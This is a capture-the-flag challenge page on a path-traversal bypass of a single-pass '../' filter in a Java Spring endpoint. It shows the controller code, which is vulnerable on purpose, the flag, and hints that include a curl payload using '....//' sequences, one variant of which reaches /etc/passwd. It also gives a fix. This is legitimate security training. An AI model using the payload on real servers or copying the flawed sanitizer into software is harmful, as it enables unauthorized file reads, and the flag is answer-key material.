# 🛡️ Level 2 — The Sanitizer That Blinks Once

> **Vector:** Path Traversal (dot-segment / broken sanitizer) · **Endpoint:** `GET /captain-america?filename=`

*(alt titles: "Cap's Shield Has a Dent" · "One Swipe Isn't Enough" · "The Filter That Forgot to Look Twice")*

---

## 📝 Description
Captain America upgraded the file viewer — now it *scrubs* your input, wiping out any `../` before opening the file. Problem is, the shield only blocks one throw. Feed it a payload that *becomes* `../` **after** the scrub, and it sails right through.

Your mission: craft a filename that survives the sanitizer and still escapes `uploads/`.

## 🧩 Vulnerable Code
**`ChallengesController.java` → `secureRead2()`**
```java
// Challenge 2: Path Normalization + Dot-Segment bypass
@GetMapping("/captain-america")
public String secureRead2(@RequestParam String filename, Model model) {
    try {
        String processedFilename = filename
                .replace("../", "");            // ◀ VULNERABLE — single, non-recursive pass
        Path filePath = Paths.get(UPLOAD_DIR + processedFilename);
        String content = Files.readString(filePath);
        model.addAttribute("content", content);
        model.addAttribute("filename", filename);
    } catch (Exception e) {
        model.addAttribute("error", "File not found or cannot be read: " + e.getMessage());
    }
    return "file-content";
}
```

## 🚩 Flag
```
CTF{234b5a3edf97aa319646be27d8a89db0}
```
*(from `flags/flag2.txt`, read as `../flag2.txt`)*

## 💡 Hints
- **Nudge:** The filter deletes `../` — but only *once*, and it never re-checks its own output.
- **Warmer:** What string, after having its inner `../` removed, *collapses back down* into `../`?
- **The key:** `....//` → strip the middle `../` → leaves `../`.
  ```bash
  curl "http://<host>/captain-america?filename=....//flag2.txt"
  # deeper: ....//....//....//....//....//....//etc/passwd
  ```

## 🔍 Vulnerable Line Explanation
**`ChallengesController.java` → `secureRead2()`**
```java
String processedFilename = filename.replace("../", "");   // ◀ VULNERABLE — single, non-recursive pass
```
`replace("../","")` runs a **single pass** and is never re-applied to its own result. So `....//` has its inner `../` removed and the leftover characters reassemble into `../` — the exact sequence it was trying to kill.

**Fix:** never sanitize by string removal. Resolve the path, then validate that the *final* location stays under the base directory.
